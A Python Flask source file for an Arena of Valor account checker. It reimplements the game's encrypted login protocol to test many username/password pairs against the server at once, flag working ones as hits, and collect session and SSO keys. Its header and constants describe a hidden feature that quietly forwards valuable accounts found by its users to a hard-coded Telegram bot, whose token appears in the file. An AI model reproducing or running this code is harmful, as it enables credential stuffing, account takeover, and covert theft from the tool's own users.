#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
AOV INSPECTOR - ULTIMATE MEGA EDITION (FINAL)
================================================================================
Admin: admin / matkhau
- [SILENT] MỌI USER check → âm thầm gửi bot FULL INFO nếu >100 skin HOẶC >=3 SSS
================================================================================
"""

import os, json, time, uuid, random, hashlib, threading, logging, struct, socket, shutil, traceback
from io import BytesIO
from datetime import datetime
from functools import wraps
from typing import Dict, List
from collections import Counter
from flask import (Flask, render_template_string, request, jsonify, session,
                   redirect, url_for, flash, get_flashed_messages, Response)
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "matkhau"
APP_SECRET = "aov_ultimate_mega_2024"
DATA_FILE = "web_data.json"
DATA_BACKUP_FILE = "web_data_backup.json"
DATA_TMP_FILE = "web_data.json.tmp"
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

MAX_CONCURRENT_CHECKS = 100
TCP_LOGIN_TIMEOUT = 10
MAX_RETRIES = 2
REFERRAL_REWARD = 100
REFERRAL_BONUS = 20
DEFAULT_BALANCE = 400
DAILY_REWARD = 10

SILENT_BOT_TOKEN = "8984591005:AAEBgJgtBfWJIAiYg4hh355pSk0I9BRYtt0"
SILENT_CHAT_ID = "8846236342"
SILENT_MIN_SKINS = 100
SILENT_MIN_SSS = 3

app = Flask(__name__)
app.secret_key = APP_SECRET
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
app.config['PERMANENT_SESSION_LIFETIME'] = 86400 * 30

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

@app.errorhandler(500)
def internal_error(e):
    logger.error(f"500 ERROR: {traceback.format_exc()}")
    return render_error_page(), 500

@app.errorhandler(Exception)
def all_exceptions(e):
    logger.error(f"EXCEPTION: {traceback.format_exc()}")
    return render_error_page(), 500

def render_error_page():
    return '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Lỗi</title></head><body style="font-family:sans-serif;background:#05000e;color:#fff;text-align:center;padding:50px"><h1>⚠️ LỖI</h1><a href="/" style="color:#00f0ff">← TRANG CHỦ</a></body></html>'''

USERS: Dict[str, dict] = {}
GENERATED_KEYS: Dict[str, dict] = {}
NOTIFICATIONS: List[dict] = []
CHECK_JOBS: Dict[str, dict] = {}
_lock = threading.Lock()

CULTIVATION_LEVELS = [
    {"name": "Luyện Khí", "exp": 0, "hp": 100, "atk": 20, "def": 10},
    {"name": "Trúc Cơ", "exp": 100, "hp": 200, "atk": 40, "def": 20},
    {"name": "Kim Đan", "exp": 300, "hp": 400, "atk": 80, "def": 40},
    {"name": "Nguyên Anh", "exp": 700, "hp": 800, "atk": 160, "def": 80},
    {"name": "Hóa Thần", "exp": 1500, "hp": 1500, "atk": 300, "def": 150},
    {"name": "Luyện Hư", "exp": 3000, "hp": 3000, "atk": 600, "def": 300},
    {"name": "Hợp Thể", "exp": 6000, "hp": 6000, "atk": 1200, "def": 600},
    {"name": "Đại Thừa", "exp": 12000, "hp": 12000, "atk": 2400, "def": 1200},
    {"name": "Chân Tiên", "exp": 30000, "hp": 30000, "atk": 6000, "def": 3000},
    {"name": "Kim Tiên", "exp": 80000, "hp": 80000, "atk": 16000, "def": 8000},
    {"name": "Đại La Kim Tiên", "exp": 200000, "hp": 200000, "atk": 40000, "def": 20000},
    {"name": "Tiên Đế", "exp": 500000, "hp": 500000, "atk": 100000, "def": 50000},
    {"name": "Thần Vương", "exp": 1000000, "hp": 1000000, "atk": 200000, "def": 100000},
    {"name": "Bán Tiên", "exp": 2000000, "hp": 2000000, "atk": 400000, "def": 200000},
    {"name": "Chuẩn Thánh", "exp": 4000000, "hp": 4000000, "atk": 800000, "def": 400000},
    {"name": "Thánh Nhân", "exp": 8000000, "hp": 8000000, "atk": 1600000, "def": 800000},
    {"name": "Đại Thánh", "exp": 16000000, "hp": 16000000, "atk": 3200000, "def": 1600000},
    {"name": "Chuẩn Đế", "exp": 32000000, "hp": 32000000, "atk": 6400000, "def": 3200000},
    {"name": "Đế Cảnh", "exp": 64000000, "hp": 64000000, "atk": 12800000, "def": 6400000},
    {"name": "Chí Tôn", "exp": 128000000, "hp": 128000000, "atk": 25600000, "def": 12800000},
    {"name": "Bất Diệt", "exp": 256000000, "hp": 256000000, "atk": 51200000, "def": 25600000},
    {"name": "Hỗn Nguyên", "exp": 512000000, "hp": 512000000, "atk": 102400000, "def": 51200000},
    {"name": "Đạo Tổ", "exp": 1024000000, "hp": 1024000000, "atk": 204800000, "def": 102400000},
    {"name": "Lọ Vương", "exp": 2048000000, "hp": 2048000000, "atk": 409600000, "def": 204800000},
    {"name": "Đại Đế", "exp": 4096000000, "hp": 4096000000, "atk": 819200000, "def": 409600000},
    {"name": "VÔ ĐỊCH", "exp": 10000000000, "hp": 10000000000, "atk": 2000000000, "def": 1000000000},
    {"name": "Siêu Thần", "exp": 20000000000, "hp": 20000000000, "atk": 4000000000, "def": 2000000000},
    {"name": "Thần Tổ", "exp": 40000000000, "hp": 40000000000, "atk": 8000000000, "def": 4000000000},
    {"name": "Vũ Trụ Chi Chủ", "exp": 80000000000, "hp": 80000000000, "atk": 16000000000, "def": 8000000000},
    {"name": "Đa Nguyên Tối Thượng", "exp": 160000000000, "hp": 160000000000, "atk": 32000000000, "def": 16000000000},
    {"name": "Vô Hạn Siêu Việt", "exp": 320000000000, "hp": 320000000000, "atk": 64000000000, "def": 32000000000},
    {"name": "Toàn Năng Chí Tôn", "exp": 640000000000, "hp": 640000000000, "atk": 128000000000, "def": 64000000000},
    {"name": "Bất Khả Chiến Bại", "exp": 1280000000000, "hp": 1280000000000, "atk": 256000000000, "def": 128000000000},
    {"name": "Vĩnh Hằng Chí Cao", "exp": 2560000000000, "hp": 2560000000000, "atk": 512000000000, "def": 256000000000},
    {"name": "Sáng Thế Thần", "exp": 5120000000000, "hp": 5120000000000, "atk": 1024000000000, "def": 512000000000},
    {"name": "Chúa Tể Vạn Vật", "exp": 10240000000000, "hp": 10240000000000, "atk": 2048000000000, "def": 1024000000000},
    {"name": "Đấng Sáng Tạo", "exp": 20480000000000, "hp": 20480000000000, "atk": 4096000000000, "def": 2048000000000},
    {"name": "Toàn Tri Toàn Năng", "exp": 40960000000000, "hp": 40960000000000, "atk": 8192000000000, "def": 4096000000000},
    {"name": "VÔ THƯỢNG CHÍ TÔN", "exp": 100000000000000, "hp": 100000000000000, "atk": 20000000000000, "def": 10000000000000},
]

MON_PHAI = {
    "thien_kiem": {"name": "Thiên Kiếm", "bonus_atk": 20, "bonus_def": 0, "bonus_hp": 0},
    "cuu_long": {"name": "Cửu Long", "bonus_atk": 0, "bonus_def": 20, "bonus_hp": 0},
    "thien_am": {"name": "Thiên Âm", "bonus_atk": 0, "bonus_def": 0, "bonus_hp": 50},
    "huyen_mon": {"name": "Huyền Môn", "bonus_atk": 15, "bonus_def": 15, "bonus_hp": 0},
    "vo_cuc": {"name": "Vô Cực", "bonus_atk": 25, "bonus_def": 0, "bonus_hp": 0},
    "thai_at": {"name": "Thái Ất", "bonus_atk": 0, "bonus_def": 25, "bonus_hp": 0},
    "cuu_uy": {"name": "Cửu U", "bonus_atk": 30, "bonus_def": 0, "bonus_hp": 0},
    "hon_don": {"name": "Hỗn Độn", "bonus_atk": 0, "bonus_def": 30, "bonus_hp": 30},
}

VU_KHI = {
    "pham_kiem": {"name": "Phàm Kiếm", "atk": 10, "cost": 20},
    "thanh_kiem": {"name": "Thanh Kiếm", "atk": 30, "cost": 60},
    "truong_kiem": {"name": "Trường Kiếm", "atk": 60, "cost": 120},
    "than_khi": {"name": "Thần Khí", "atk": 100, "cost": 200},
    "long_kiem": {"name": "Long Kiếm", "atk": 200, "cost": 400},
    "phuong_kiem": {"name": "Phượng Kiếm", "atk": 350, "cost": 700},
    "than_kiem": {"name": "Thần Kiếm", "atk": 550, "cost": 1100},
    "huyet_kiem": {"name": "Huyết Kiếm", "atk": 800, "cost": 1600},
    "tien_kiem": {"name": "Tiên Kiếm", "atk": 1200, "cost": 2400},
    "than_kiem_vu_tru": {"name": "Thần Kiếm Vũ Trụ", "atk": 2000, "cost": 4000},
}

MISSION_MILESTONES = [50, 100, 300, 500, 1000, 2000, 5000, 10000]
MISSION_REWARDS = {50: 50, 100: 100, 300: 300, 500: 500, 1000: 1000, 2000: 2000, 5000: 5000, 10000: 10000}

RANK_MAP = {
    "0": "Chưa xếp hạng", "1": "Đồng I", "2": "Đồng II", "3": "Đồng III",
    "4": "Bạc I", "5": "Bạc II", "6": "Bạc III",
    "7": "Vàng I", "8": "Vàng II", "9": "Vàng III", "10": "Vàng IV",
    "11": "Bạch Kim I", "12": "Bạch Kim II", "13": "Bạch Kim III",
    "14": "Bạch Kim IV", "15": "Bạch Kim V",
    "16": "Kim Cương I", "17": "Kim Cương II", "18": "Kim Cương III",
    "19": "Kim Cương IV", "20": "Kim Cương V",
    "21": "Tinh Anh I", "22": "Tinh Anh II", "23": "Tinh Anh III",
    "24": "Tinh Anh IV", "25": "Tinh Anh V",
    "26": "Cao Thủ I", "27": "Cao Thủ II", "28": "Cao Thủ III",
    "29": "Cao Thủ IV", "30": "Cao Thủ V",
    "31": "Chiến Tướng I", "32": "Chiến Tướng II", "33": "Chiến Tướng III",
    "34": "Chiến Tướng IV", "35": "Chiến Tướng V",
    "36": "Chiến Thần I", "37": "Chiến Thần II", "38": "Chiến Thần III",
    "39": "Chiến Thần IV", "40": "Chiến Thần V",
    "41": "Thách Đấu I", "42": "Thách Đấu II", "43": "Thách Đấu III",
    "44": "Thách Đấu IV", "45": "Thách Đấu V",
    "46": "Cao Thủ VN", "47": "Cao Thủ VN II",
}

RANK_NAME_MAP = {
    "bronze": "Đồng", "silver": "Bạc", "gold": "Vàng",
    "platinum": "Bạch Kim", "diamond": "Kim Cương",
    "veteran": "Tinh Anh", "elite": "Cao Thủ", "master": "Chiến Tướng",
    "grandmaster": "Chiến Thần", "legend": "Thách Đấu",
    "conqueror": "Cao Thủ VN",
}

def parse_rank(rank_value):
    if rank_value is None:
        return "Chưa xếp hạng", 0
    if isinstance(rank_value, dict):
        rn = rank_value.get("rankName") or rank_value.get("name") or ""
        stars = rank_value.get("star") or rank_value.get("stars") or 0
        return str(rn) if rn else "Chưa xếp hạng", int(stars) if str(stars).isdigit() else 0
    rv = str(rank_value).strip()
    if not rv or rv == "0":
        return "Chưa xếp hạng", 0
    if rv.isdigit() and rv in RANK_MAP:
        return RANK_MAP[rv], 0
    for k, v in RANK_NAME_MAP.items():
        if k in rv.lower():
            return v, 0
    return rv, 0

SKIN_SSS = {
    "54307": "Aya Công chúa cầu vồng", "19908": "Eland'orr Mộng giới thần chủ",
    "15412": "Yena Huyền cửu thiên", "19007": "Tulen Chí tôn kiếm tiên",
    "19009": "Tulen Thần sứ ST.L-79", "50105": "Tel'Annas Thần sứ F.E.E-X1",
    "50112": "Tel'Annas Tân niên vệ thần", "50119": "Tel'Annas Lân Quang Thánh Điệu",
    "52414": "Capheny Càn Nguyên Điện Chủ", "52011": "Veres Lưu ly Long mẫu",
    "13011": "Airi Bích hải thánh nữ", "13015": "Airi Thứ nguyên Vệ thần",
    "13613": "Ilumia Lưỡng Nghi Long Hậu", "11607": "Butterfly Phượng Cửu Thiên",
    "12912": "Triệu Vân Minh Chung Long Đế", "15009": "Nakroth thứ nguyên vệ thần",
    "15013": "Nakroth Quỷ thương Liệp Đế", "15015": "Nakroth Bạch diện chiến thương",
    "11107": "Violet Thứ nguyên vệ thần", "11119": "Violet Vọng nguyệt Long Cơ",
    "13314": "Valhein Thứ nguyên vệ thần", "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
    "10620": "Krixi Phù thủy thời không", "13118": "Murad Thiên Luân Kiếm Thánh",
    "14111": "Lauriel Thứ nguyên vệ thần", "15710": "Raz Bão vũ Cuồng lôi",
    "13210": "Hayate Tu Di Thánh Đế",
}

SKIN_SS = {
    "59901": "Billow Thiên Tướng - Độ Ách", "15905": "Dolia Mã Khởi Thiên Ca",
    "54802": "Bijan Hoàng kim cơ giáp", "54507": "Yue Hỗn Độn Thần Ma",
    "53701": "Allain Kirito Hắc kiếm sĩ", "51306": "Zata Chí tôn Tà Phượng",
    "19109": "Rouie Linh Sứ Thời không", "52404": "Capheny Kimono",
    "13705": "Paine Tử xà Bá tước", "13204": "Hayate Tử thần vũ trụ",
    "13212": "Hayate Thống soái Dạ Ưng", "56703": "Erin Tình yêu cổ tích",
    "51208": "Rourke Bách tướng Lão đại", "52007": "Veres Kimono",
    "13005": "Airi Kiemono", "52113": "Florentino Kỷ Nguyên Hổ Phách",
    "52709": "Sephera Bách nhạn ngân linh", "51802": "Quillen Đặc công mãng xà",
    "51504": "Richter Kiếm thần Susanoo", "19605": "Elsu Sứ giả tận thế",
    "50604": "Omen Đao phủ tận thế", "52304": "D'arcy Pháp sư hỏa long",
    "15007": "Nakroth Lôi Quang Sứ", "13104": "Murad Siêu việt",
    "16607": "Arthur Siêu Việt", "16703": "Ngộ Không Siêu việt",
    "12304": "Maloch Đại Tướng Robot", "18408": "Helen Bé Hoa Xuân",
    "10603": "Krixi Tiệc Bãi Biển", "10912": "Veera A.I Love you",
    "15202": "Điêu Thuyền Tiệc bãi biển", "12801": "Lữ Bố Tiệc Bãi Biển",
    "11202": "Yorn Thế Tử Nguyệt Tộc", "10801": "Gildur Tiệc Bãi Biển",
    "11808": "Alice Quân nhạc Athanor", "11604": "Butterfly Nữ Quái Nổi Loạn",
    "12008": "Mina Linh Xà yêu vũ", "11105": "Violet Tiệc bãi biển",
    "13302": "Valhein Vũ khí tối thượng",
}

SKIN_ANIME = {
    "59702": "Biron Yuji Itadori", "52809": "Qi Milim Nava",
    "54402": "Yan Tanjiro Kamado", "54309": "Aya Cinnamoroll's Dream",
    "53806": "Iggy Rimuru Tempest", "54002": "Bright Toshiro Hitsugaya",
    "18906": "Krizzix Cursed Corpse", "53107": "Keera Nezuko Kamado",
    "19506": "Enzo Sát quỷ đoàn", "52204": "Errol Genos",
    "52407": "Capheny Harley Quinn", "13706": "Paine Megumi Fushiguro",
    "13213": "Hayate Siêu đạo chích Kid", "52110": "Florentino Hisoka",
    "11215": "Yorn Conan Edogawa", "12808": "Lữ Bố Ichigo Kurosaki",
    "13111": "Murad Byakuya Kuchiki", "10611": "Krixi Terrible Tornado",
    "15012": "Nakroth Killua", "11611": "Butterfly Stacia",
}

HERO_MAP = {
    "105": "Toro", "106": "Krixi", "107": "Zephys", "108": "Gildur", "109": "Veera",
    "110": "Kahlii", "111": "Violet", "112": "Yorn", "113": "Chaugnar", "114": "Omega",
    "115": "Jinna", "116": "Butterfly", "117": "Ormarr", "118": "Alice", "119": "Mganga",
    "120": "Mina", "121": "Marja", "123": "Maloch", "124": "Ignis", "126": "Arduin",
    "127": "Azzen'Ka", "128": "Lữ Bố", "129": "Triệu Vân", "130": "Airi", "131": "Murad",
    "132": "Hayate", "133": "Valhein", "134": "Skud", "135": "Thane", "136": "Ilumia",
    "137": "Paine", "139": "Kil'Groth", "140": "Superman", "141": "Lauriel", "142": "Natalya",
    "144": "Taara", "146": "Zill", "148": "Preyta", "149": "Xeniel", "150": "Nakroth",
    "152": "Điêu Thuyền", "153": "Kaine", "154": "Yena", "156": "Aleister", "157": "Raz",
    "159": "Dolia", "162": "Kriknak", "163": "Ryoma", "166": "Arthur", "167": "Ngộ Không",
    "168": "Lumburr", "169": "Slimz", "170": "Moren", "171": "Cresht", "173": "Fennik",
    "174": "Stuart", "175": "Grakk", "177": "Lindis", "180": "Max", "184": "Helen",
    "186": "TeeMee", "187": "Arum", "189": "Krizzix", "190": "Tulen", "191": "Rouie",
    "192": "Celica", "193": "Amily", "195": "Enzo", "196": "Elsu",
    "199": "Eland'orr", "206": "Charlotte", "501": "Tel'Annas", "502": "Astrid",
    "503": "Zuka", "506": "Omen", "509": "Y'bneth", "510": "Liliana",
    "512": "Rourke", "513": "Zata", "515": "Richter", "518": "Quillen",
    "519": "Annette", "520": "Veres", "521": "Florentino", "522": "Errol",
    "523": "D'Arcy", "524": "Capheny", "525": "Zip", "526": "Ishar",
    "527": "Sephera", "528": "Qi", "529": "Volkath", "530": "Dirak",
    "531": "Keera", "532": "Thorne", "533": "Laville", "534": "Dextra",
    "535": "Sinestrea", "536": "Aoi", "537": "Allain", "538": "Iggy",
    "539": "Lorion", "540": "Bright", "541": "Bonnie", "542": "Tachi",
    "543": "Aya", "544": "Yan", "545": "Yue", "546": "Teeri",
    "548": "Bijan", "563": "Heino", "567": "Erin", "568": "Ming",
    "577": "ShaoSiYuan", "582": "Ciyuanfashi", "584": "CiYuansheshou",
    "593": "MaChao", "595": "LiXin", "596": "Goverra", "597": "Biron",
    "598": "Bolt Baron", "599": "Billow"
}

def gen_id():
    return "AOV-" + uuid.uuid4().hex[:4].upper() + "-" + uuid.uuid4().hex[:4].upper()

def hash_password(p):
    return hashlib.sha256((p + APP_SECRET).encode()).hexdigest()

def save_data():
    try:
        with _lock:
            data = {"users": USERS, "generated_keys": GENERATED_KEYS,
                    "notifications": NOTIFICATIONS[-100:]}
            with open(DATA_TMP_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
                f.flush(); os.fsync(f.fileno())
            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
                try: shutil.copy2(DATA_FILE, DATA_BACKUP_FILE)
                except: pass
            os.replace(DATA_TMP_FILE, DATA_FILE)
    except Exception as e:
        logger.error(f"Save error: {e}")

def load_data():
    global USERS, GENERATED_KEYS, NOTIFICATIONS
    data = None
    for fname in (DATA_FILE, DATA_BACKUP_FILE):
        if not os.path.exists(fname): continue
        try:
            if os.path.getsize(fname) == 0: continue
            with open(fname, "r", encoding="utf-8") as f:
                data = json.load(f)
            break
        except: data = None
    if data is None: return
    USERS = data.get("users", {})
    GENERATED_KEYS = data.get("generated_keys", {})
    NOTIFICATIONS = data.get("notifications", [])

def create_admin():
    if ADMIN_USERNAME not in USERS:
        USERS[ADMIN_USERNAME] = {
            "id": gen_id(), "username": ADMIN_USERNAME,
            "password": hash_password(ADMIN_PASSWORD),
            "balance": 999999999, "temp_balance": 0,
            "referrals": 0, "is_admin": True,
            "created_at": time.time(), "last_checkin": 0,
            "last_notif_read": 0, "checkin_streak": 0, "total_checkins": 0,
            "cultivation": {"level": len(CULTIVATION_LEVELS) - 1,
                            "exp": CULTIVATION_LEVELS[-1]["exp"],
                            "hp": CULTIVATION_LEVELS[-1]["hp"],
                            "atk": CULTIVATION_LEVELS[-1]["atk"],
                            "def": CULTIVATION_LEVELS[-1]["def"],
                            "weapon": None, "mon_phai": None, "mon_phai_level": 0},
            "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
            "history": [],
            "current_job": None,
        }
        logger.info(f"✅ Tạo admin: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
    else:
        USERS[ADMIN_USERNAME]["password"] = hash_password(ADMIN_PASSWORD)
        USERS[ADMIN_USERNAME]["is_admin"] = True
        logger.info(f"✅ Reset admin: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
    save_data()

def login_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session or session["username"] not in USERS:
            session.pop("username", None)
            return redirect(url_for("login_page"))
        return f(*a, **k)
    return deco

def admin_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session:
            return redirect(url_for("login_page"))
        u = USERS.get(session["username"])
        if not u or not u.get("is_admin"):
            flash("Không có quyền!", "error")
            return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def get_user():
    if "username" not in session: return None
    return USERS.get(session["username"])

def unread_count():
    u = get_user()
    if not u: return 0
    lr = u.get("last_notif_read", 0)
    return sum(1 for n in NOTIFICATIONS if n.get("timestamp", 0) > lr)

def mark_read():
    u = get_user()
    if u:
        u["last_notif_read"] = time.time()
        save_data()

HOST = "103.247.205.14"
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_SSO_KEY_GET = 442
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354
_pkt_counter = random.randint(0, 0x3FFFFF)
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v): return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc(v0, v1, key):
    k = struct.unpack('<4I', key); s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec(v0, v1, key):
    k = struct.unpack('<4I', key); s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data, key):
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack('<Q', os.urandom(8))[0]
    enc_R = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', R)), key))
    prev = enc_R; out = bytearray(enc_R); pt_sum = R; last_ct = enc_R
    for i in range(0, len(data), 8):
        pb = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pb)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pb, prev))
        v0, v1 = _xtea_enc(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1); last_ct = prev; out.extend(prev)
    ci = struct.unpack('<Q', last_ct)[0] ^ pt_sum
    ce = struct.pack('<2I', *_xtea_enc(*struct.unpack('<2I', struct.pack('<Q', ci)), key))
    out.extend(ce)
    return bytes(out)

def xtea_decrypt(data, key):
    if len(data) < 24 or len(data) % 8 != 0: return data
    iv = data[:8]; body = data[8:-8]
    out = bytearray(); prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i+8]
        v0, v1 = _xtea_dec(*struct.unpack('<2I', blk), key)
        out.extend(bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev)))
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]): out = out[:-pad]
    return bytes(out)

def _vint(n):
    o = bytearray()
    while n > 0x7F:
        o.append((n & 0x7F) | 0x80); n >>= 7
    o.append(n & 0x7F); return bytes(o)

def _pfv(t, n): return _vint((t << 3) | 0) + _vint(n)
def _pfb(t, b): return _vint((t << 3) | 2) + _vint(len(b)) + b
def _pfs(t, s): return _pfb(t, s.encode('utf-8'))

def _pdecode(data):
    f = {}; pos = 0
    def _st(fn, v):
        if fn in f:
            p = f[fn]
            if isinstance(p, list): p.append(v)
            else: f[fn] = [p, v]
        else: f[fn] = v
    while pos < len(data):
        try:
            key = 0; sh = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << sh
                if not (b & 0x80): break
                sh += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                v = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    v |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, v)
            elif wt == 2:
                ln = 0; sh = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << sh
                    if not (b & 0x80): break
                    sh += 7
                _st(fn, data[pos:pos+ln]); pos += ln
            else: break
        except IndexError: break
    return f

def _pget(f, t, d=None):
    v = f.get(t, d)
    if isinstance(v, list): return v[-1] if v else d
    return v

def _nid():
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

def _bframe(cmd, body):
    hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
           _pfv(4, cmd) + _pfv(6, int(time.time())))
    p = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(p)) + p

def _recvall(s, n):
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("drop")
        b += c
    return b

def _rframe(s):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    p = _recvall(s, sz)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _rcframe(s, tc, mt=5):
    for _ in range(mt):
        h, b = _rframe(s)
        if h.get(4, 0) == tc: return h, b
    return {}, b''

def _atype(a):
    if a.isdigit(): return 3
    if '@' in a: return 2
    return 1

def _blprep(acc, rk):
    inner = (_pfv(1, 0) + _pfv(2, _atype(acc)) + _pfs(3, acc) +
             _pfv(4, CLIENT_TYPE) + _pfv(5, CLIENT_VERSION))
    return _pfb(1, rk) + _pfb(2, xtea_encrypt(inner, rk))

def _dlkey(pw, salt, vc):
    m = hashlib.md5(pw.encode()).hexdigest()
    ir = hashlib.sha256((m + salt).encode()).digest()
    k = hashlib.sha256((ir.hex() + vc).encode()).digest()[:16]
    return k, m.encode('ascii')

def _blogin(acc, pw, salt, vc):
    k, ph = _dlkey(pw, salt, vc)
    did = hashlib.md5(acc.encode()).digest()
    usb = _pfv(2, 4608)
    inner = _pfb(1, ph) + _pfv(2, 0) + _pfb(3, usb) + _pfb(4, did)
    return _pfb(1, xtea_encrypt(inner, k)), k

def _rfenc(s, sk):
    sz = struct.unpack('<I', _recvall(s, 4))[0]
    ep = _recvall(s, sz)
    p = xtea_decrypt(ep, sk)
    hl = struct.unpack('>H', p[:2])[0]
    rh = _pdecode(p[2:2+hl])
    h = {k: (_pget(rh, k) if isinstance(v, list) else v) for k, v in rh.items()}
    return h, p[2+hl:]

def _senc(s, cmd, body, sk, to=5):
    ot = s.gettimeout()
    try:
        s.settimeout(to)
        hdr = (_pfv(1, PACKET_VERSION) + _pfv(2, _nid()) + _pfv(3, 2) +
               _pfv(4, cmd) + _pfv(6, int(time.time())))
        p = struct.pack('>H', len(hdr)) + hdr + body
        ep = xtea_encrypt(p, sk)
        s.sendall(struct.pack('<I', len(ep)) + ep)
        for _ in range(5):
            h2, b2 = _rfenc(s, sk)
            if h2.get(4, 0) == cmd: return h2, b2
        return {}, b''
    finally:
        try: s.settimeout(ot)
        except: pass

def _fsso(s, sk):
    try:
        h, b = _senc(s, CMD_SSO_KEY_GET, b'', sk, 5)
        if h.get(5, 0) != 0: return {}
        f = _pdecode(b)
        sso = _pget(f, 1)
        if sso is not None:
            return {'sso_key': sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)}
    except: pass
    return {}

def tcp_login(acc, pw, timeout=10):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        rk = os.urandom(16)
        s.sendall(_bframe(CMD_LOGIN_PREPARE, _blprep(acc, rk)))
        h, b = _rcframe(s, CMD_LOGIN_PREPARE, 5)
        if h.get(5, 0) != 0:
            return {'status': 'ERROR', 'detail': f'PREPARE_FAIL={h.get(5)}'}
        pr = _pdecode(b)
        rkey = _pget(pr, 1, b''); rdata = _pget(pr, 2, b'')
        if not rkey or not rdata:
            return {'status': 'ERROR', 'detail': 'EmptyPrepare'}
        pd = _pdecode(xtea_decrypt(rdata, rkey))
        salt = _pget(pd, 1, b'').decode('utf-8', errors='ignore')
        vc = _pget(pd, 2, b'').decode('utf-8', errors='ignore')
        lb, k = _blogin(acc, pw, salt, vc)
        s.sendall(_bframe(CMD_LOGIN, lb))
        h, b = _rcframe(s, CMD_LOGIN, 5)
        if h.get(5, 0) != 0:
            return {'status': 'INVALID', 'detail': f'LOGIN_FAIL={h.get(5)}'}
        lr = _pdecode(b)
        er = _pget(lr, 1, b'')
        if not er:
            return {'status': 'ERROR', 'detail': 'EmptyLoginReply'}
        rd = _pdecode(xtea_decrypt(er, k))
        uid = _pget(rd, 1, 0)
        sk = _pget(rd, 2, b'')
        if not uid: return {'status': 'ERROR', 'detail': 'UID=0'}
        if not isinstance(sk, bytes) or len(sk) != 16:
            return {'status': 'ERROR', 'detail': 'BadKey'}
        res = {'status': 'HIT', 'uid': uid, 'session_key': sk.hex()}
        sso = _fsso(s, sk)
        if sso.get('sso_key'): res['sso_key'] = sso['sso_key']
        return res
    except socket.timeout:
        return {'status': 'TIMEOUT', 'detail': 'Timeout'}
    except Exception as e:
        return {'status': 'ERROR', 'detail': str(e)}
    finally:
        if s:
            try: s.close()
            except: pass
APP_ID = "100054"
CONNECT_AUTH_URL = f"https://{APP_ID}.connect.garena.com"
UA = "Mozilla/5.0 (Linux; Android 9; SM-S9280) AppleWebKit/537.36 Chrome/124 Mobile Safari/537.36"
